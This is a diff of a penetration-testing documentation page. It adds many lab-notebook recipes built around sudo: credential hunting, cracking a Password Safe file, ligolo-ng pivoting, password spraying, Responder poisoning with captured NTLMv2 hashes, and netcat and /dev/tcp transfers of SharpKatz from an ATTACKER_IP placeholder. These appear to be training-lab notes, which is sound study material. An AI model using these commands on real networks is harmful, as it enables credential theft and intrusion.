@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=sudo) · [All tools](/index)
+
 ## List permitted commands
 
 **Kali / Linux**
@@ -33,8 +35,2401 @@ A password-required error does not mean there are no sudo permissions.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=sudo)
+## Notebook recipes
 
-## Learning and original examples
+156 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="5. Credential hunting (Linux)">
+
+### 5. Credential hunting (Linux)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+sudo ./proxy -selfcert            # listens :11601
+# DMZ01
+./agent -connect <KALI>:11601 -ignore-cert
+# Kali (in proxy console type `start`, then add the route)
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now tools work WITHOUT proxychains:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+```
+
+</Accordion>
+
+<Accordion title="1. CrackMapExec (CME) / NetExec">
+
+### 1. CrackMapExec (CME) / NetExec
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb <TARGET_IP> -u forend -p Klmcargo2 --loggedon-users
+```
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+
+</Accordion>
+
+<Accordion title="6. BloodHound.py">
+
+### 6. BloodHound.py
+
+**Active Directory Enumeration from Linux**
+
+```bash
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+```
+
+**Active Directory Enumeration from Linux**
+
+Context from the notebook: Start the Neo4j database:  sudo neo4j start
+
+```text
+sudo neo4j start
+```
+
+</Accordion>
+
+<Accordion title="Internal password spraying from linux">
+
+### Internal password spraying from linux
+
+**Active Directory Password Spraying**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
+```
+
+</Accordion>
+
+<Accordion title="11. The decisive technique — running only the decryptor under QEMU">
+
+### 11. The decisive technique — running only the decryptor under QEMU
+
+**Android Banking Trojan: Reverse-Engineering Walkthrough**
+
+```bash
+sudo apt install -y qemu-user gcc-aarch64-linux-gnu libc6-dev-arm64-cross
+```
+
+</Accordion>
+
+<Accordion title="Host - A Records">
+
+### Host - A Records
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00025s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+MAC Address: 00:00:00:00:00:00 (VMware)
+```
+
+</Accordion>
+
+<Accordion title="Capture MSSQL Service Hash">
+
+### Capture MSSQL Service Hash
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+grcic550@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+
+XP_SUBDIRS Hash Stealing with impacket
+```
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+grcic550@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo responder -I tun0
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)
+[*] Remaining connections []
+```
+
+</Accordion>
+
+<Accordion title="BloodHound — Start, Collect, and Import">
+
+### BloodHound — Start, Collect, and Import
+
+**BloodHound — Start, Collect, and Import**
+
+```bash
+sudo bloodhound-start
+```
+
+</Accordion>
+
+<Accordion title="Stop or restart">
+
+### Stop or restart
+
+**BloodHound — Start, Collect, and Import**
+
+```bash
+# Stop the Kali package
+sudo bloodhound-stop
+
+# Start it again
+sudo bloodhound-start
+```
+
+</Accordion>
+
+<Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+
+**BloodHound: Full Reference**
+
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+
+</Accordion>
+
+<Accordion title="Detect it (nmap NSE)">
+
+### Detect it (nmap NSE)
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+```bash
+# copy into nmap's script dir (or point at it directly), then:
+sudo nmap -p443 --script=http-citrix-cve-2019-19781 <TARGET>
+```
+
+</Accordion>
+
+<Accordion title="How to spot it on a scan">
+
+### How to spot it on a scan
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+```bash
+# Fingerprint the web service
+curl -sik https://<TARGET>/ | grep -iE 'citrix|netscaler|nsc_'
+whatweb https://<TARGET>/
+
+# nmap service + the CVE detection script (see below)
+sudo nmap -p443 -sV --script ssl-cert <TARGET>
+```
+
+</Accordion>
+
+<Accordion title="Email">
+
+### Email
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo apt-get install evolution
+...SNIP...
+```
+
+</Accordion>
+
+<Accordion title="Enumeration">
+
+### Enumeration
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
+Nmap scan report for 192.168.2.142
+Host is up (0.00054s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
+| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
+| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
+| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
+| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
+| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
+|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00024s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 00:00:00:00:00:00 (VMware)
+
+Host script results:
+|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-09-19T13:16:04
+|_  start_date: N/A
+
+The Nmap scan reveals essential information about the target:
+
+    SMB version (Samba smbd 4.6.2)
+    Hostname HTB
+    Operating System is Linux based on SMB implementation
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00025s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
+MAC Address: 00:00:00:00:00:00 (VMware)
+```
+
+</Accordion>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo responder -I ens33
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.198]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-2TY1Z1CIGXH]
+    Responder Domain Name      [HF2L.LOCAL]
+    Responder DCE-RPC Port     [48162]
+
+[+] Listening for events...
+
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
+```
+
+</Accordion>
+
+<Accordion title="GUI Application">
+
+### GUI Application
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb
+
+To start the application use:
+```
+
+</Accordion>
+
+<Accordion title="Linux">
+
+### Linux
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo mkdir /mnt/Finance
+grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+```
+
+</Accordion>
+
+<Accordion title="Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)">
+
+### Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)
+
+**Common Services: Personal Assessment Notes**
+
+```text
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+</Accordion>
+
+<Accordion title="Post-Discovery">
+
+### Post-Discovery
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# Add found vhosts to /etc/hosts
+sudo nano /etc/hosts
+# Add: <IP>   domain.tld app.domain.tld dev.domain.tld
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference — Install Commands">
+
+### Quick Reference — Install Commands
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# jq (JSON processor)
+sudo apt install jq
+
+# wafw00f
+pip3 install git+https://github.com/EnableSecurity/wafw00f
+
+# Nikto
+sudo apt update && sudo apt install -y perl
+git clone https://github.com/sullo/nikto
+
+# WPScan
+sudo apt install wpscan
+
+# SecLists
+sudo apt install seclists
+
+# Scrapy
+pip3 install scrapy
+
+# FinalRecon
+git clone https://github.com/thewhiteh4t/FinalRecon.git
+cd FinalRecon && pip3 install -r requirements.txt && chmod +x ./finalrecon.py
+```
+
+</Accordion>
+
+<Accordion title="FTP Downloads">
+
+### FTP Downloads
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+```
+
+</Accordion>
+
+<Accordion title="FTP Uploads">
+
+### FTP Uploads
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+</Accordion>
+
+<Accordion title="Netcat / Ncat File Transfers">
+
+### Netcat / Ncat File Transfers
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker (listener — sends file)
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+# On target (connects and receives)
+nc <ATTACKER_IP> 443 > SharpKatz.exe
+ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Attacker listens
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+# Target connects with bash
+cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
+```
+
+</Accordion>
+
+<Accordion title="SCP (SSH-based Transfer)">
+
+### SCP (SSH-based Transfer)
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Enable SSH on your attack box first
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# From target — download a file from attack box
+scp user@<ATTACKER_IP>:/path/to/file .
+
+# From attack box — upload a file to target
+scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
+```
+
+</Accordion>
+
+<Accordion title="SMB Downloads">
+
+### SMB Downloads
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+**File Transfers for Linux and Windows**
+
+```zsh
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/rdp-share
+```
+
+</Accordion>
+
+<Accordion title="SMB Uploads (WebDAV)">
+
+### SMB Uploads (WebDAV)
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+</Accordion>
+
+<Accordion title="Setup Steps">
+
+### Setup Steps
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default          # remove if port 80 conflict
+sudo systemctl restart nginx.service
+```
+
+**File Transfers for Linux and Windows**
+
+Context from the notebook: Verify:   sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
+
+```text
+sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
+```
+
+</Accordion>
+
+<Accordion title="Web Upload (Python uploadserver with HTTPS)">
+
+### Web Upload (Python uploadserver with HTTPS)
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attack box — create self-signed cert and start server
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+</Accordion>
+
+<Accordion title="Windows LOLBins">
+
+### Windows LOLBins
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker — start listener
+sudo nc -lvnp 8000
+```
+
+</Accordion>
+
+<Accordion title="10. Use ripgrep — much faster and handles more">
+
+### 10. Use ripgrep — much faster and handles more
+
+**Find Credentials in Network Shares**
+
+```bash
+sudo apt install ripgrep -y
+
+# fast recursive search excluding noise
+rg -i "password|cred|secret|${DOMAIN}\\\\" --glob '!Tools/**' --glob '!*.dll' --glob '!*.exe'
+
+# show context
+rg -i -C 2 "passw" --glob '!Tools/**'
+
+# only filenames
+rg -li "passw" --glob '!Tools/**'
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials on Linux">
+
+### Find Credentials on Linux
+
+**Find Credentials on Linux**
+
+```bash
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+**Find Credentials on Linux**
+
+```bash
+make
+sudo ./mimipenguin
+```
+
+**Find Credentials on Linux**
+
+```bash
+sudo python2.7 laZagne.py all
+```
+
+</Accordion>
+
+<Accordion title="NFS (Port 2049)">
+
+### NFS (Port 2049)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# List available shares
+showmount -e <IP>
+
+# Mount a share
+mkdir /tmp/target-NFS
+sudo mount -t nfs <IP>:/<share> /tmp/target-NFS
+
+# Browse (use sudo — NFS permissions may block normal user)
+sudo ls -la /tmp/target-NFS/<folder>
+sudo cat /tmp/target-NFS/<folder>/file.txt
+
+# Unmount when done (important — stale mounts freeze your terminal)
+sudo umount -f /tmp/target-NFS
+sudo umount -l /tmp/target-NFS   # if -f doesn't work
+```
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+Context from the notebook: Lesson learned:  NFS directory showed  drwx------  owned by  nobody  — couldn't enter as normal user.  sudo ls  and  sudo cat  solved it. Also, stale NFS mounts will freeze  ls  in that directory — always unmount when the target goes down.
+
+```text
+sudo ls
+```
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+Context from the notebook: Lesson learned:  NFS directory showed  drwx------  owned by  nobody  — couldn't enter as normal user.  sudo ls  and  sudo cat  solved it. Also, stale NFS mounts will freeze  ls  in that directory — always unmount when the target goes down.
+
+```text
+sudo cat
+```
+
+</Accordion>
+
+<Accordion title="Phase 1 — Port Scanning">
+
+### Phase 1 — Port Scanning
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Quick default scan
+sudo nmap <IP> --disable-arp-ping -n --stats-every=10s
+
+# Full port scan (don't skip this — services hide on non-standard ports)
+nmap -sV -p- <IP> --min-rate 5000
+
+# UDP scan (SNMP is often missed)
+sudo nmap -sU <IP> -p 161,162,53,69 --disable-arp-ping -n
+
+# Detailed scan on found ports
+nmap -sV -sC <IP> -p<ports> --disable-arp-ping -n
+```
+
+</Accordion>
+
+<Accordion title="First look at privilege escalation">
+
+### First look at privilege escalation
+
+**Getting Started with Penetration Testing**
+
+```bash
+# Linux
+sudo -l                       # what can I run as root?
+id; whoami
+find / -perm -4000 2>/dev/null   # SUID binaries
+uname -a                      # kernel version (kernel exploits)
+
+# Windows
+whoami /priv                  # dangerous privileges?
+systeminfo                    # patch level / OS
+```
+
+</Accordion>
+
+<Accordion title="Enumeration (post-foothold)">
+
+### Enumeration (post-foothold)
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+sudo -l
+# User nibbler may run the following commands on Nibbles:
+#     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+Context from the notebook: Tried  sudo su -  out of habit — asked for a password I didn't have. Listed the home directory instead ( ls -la /home/nibbler ) and found  personal.zip  and  user.txt .
+
+```text
+sudo su -
+```
+
+</Accordion>
+
+<Accordion title="Exploitation steps">
+
+### Exploitation steps
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+Context from the notebook: You  must  invoke the script with the exact absolute path shown in  sudo -l .  cd -ing into  personal/stuff/  and running  sudo ./monitor.sh  or  sudo monitor.sh  will fail — the sudoers rule matches the command string literally.
+
+```text
+sudo ./monitor.sh
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+Context from the notebook: You  must  invoke the script with the exact absolute path shown in  sudo -l .  cd -ing into  personal/stuff/  and running  sudo ./monitor.sh  or  sudo monitor.sh  will fail — the sudoers rule matches the command string literally.
+
+```text
+sudo monitor.sh
+```
+
+</Accordion>
+
+<Accordion title="How IPMI works and why owning the BMC is game over">
+
+### How IPMI works and why owning the BMC is game over
+
+**IPMI and BMC Enumeration**
+
+```bash
+sudo nmap -sU --script ipmi-version -p 623 <TARGET-IP>
+```
+
+</Accordion>
+
+<Accordion title="Check installation on Kali">
+
+### Check installation on Kali
+
+**Impacket: Script Quick Reference**
+
+```bash
+command -v impacket-psexec
+impacket-psexec -h
+# If missing:
+sudo apt install impacket-scripts
+```
+
+</Accordion>
+
+<Accordion title="Tools and techniques">
+
+### Tools and techniques
+
+**Initial Active Directory Enumeration**
+
+```bash
+sudo nmap -sS -v -A 172.16.5.5 172.16.5.130 -oN /home/htb-student/Documents/hosts-enum
+```
+
+</Accordion>
+
+<Accordion title="Finding things">
+
+### Finding things
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
+find . -type f -mmin -10               # files modified in last 10 min
+locate sqlmap                          # fast name search (run: sudo updatedb first)
+which nmap                             # path of a command
+whereis nmap
+grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
+```
+
+</Accordion>
+
+<Accordion title="12. Run BloodHound CE collection">
+
+### 12. Run BloodHound CE collection
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo apt update
+sudo apt install -y bloodhound-ce-python
+```
+
+</Accordion>
+
+<Accordion title="3. Start the proxy on Kali">
+
+### 3. Start the proxy on Kali
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+cd ~/ligolo
+sudo ./proxy -selfcert
+```
+
+</Accordion>
+
+<Accordion title="6. Create the TUN interface">
+
+### 6. Create the TUN interface
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip tuntap add user "$USER" mode tun ligolo
+sudo ip link set ligolo up
+```
+
+</Accordion>
+
+<Accordion title="9. Add the route on Kali">
+
+### 9. Add the route on Kali
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
